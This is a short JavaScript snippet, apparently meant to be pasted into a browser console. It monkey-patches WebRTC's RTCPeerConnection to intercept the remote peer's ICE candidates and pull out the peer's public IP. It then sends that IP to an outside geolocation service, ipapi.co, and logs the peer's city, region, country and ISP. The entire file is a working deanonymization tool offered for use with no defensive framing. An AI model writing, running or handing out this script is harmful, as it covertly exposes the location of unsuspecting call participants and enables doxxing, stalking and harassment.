tracker = "https://whatismyipaddress.com/ip/"
window.oRTCPeerConnection  = window.oRTCPeerConnection || window.RTCPeerConnection
window.RTCPeerConnection = function(...args) {
	const pc = new window.oRTCPeerConnection(...args)
	pc.oaddIceCandidate = pc.addIceCandidate
	pc.addIceCandidate = function(iceCandidate, ...rest) {
		const fields = iceCandidate.candidate.split(' ')
		if (fields[7] === 'srflx') {
			fetch('https://ipapi.co/' + fields[4] + "/json/")
				.then(response => response.json())
				.then(data => obj = data)
				.then(() => console.log("IP:", obj.ip))
				.then(() => console.log("City:", obj.city))
				.then(() => console.log("Region:", obj.region))
				.then(() => console.log("Country:", obj.country_name))
				.then(() => console.log("ISP:", obj.org))
				.then(() => console.log("--------------------------------------"))
				.catch(function() {
					console.log("Disable Adblocker!!");
				});
			console.log(tracker + fields[4]);
		}
		return pc.oaddIceCandidate(iceCandidate, ...rest)
	}
	return pc
}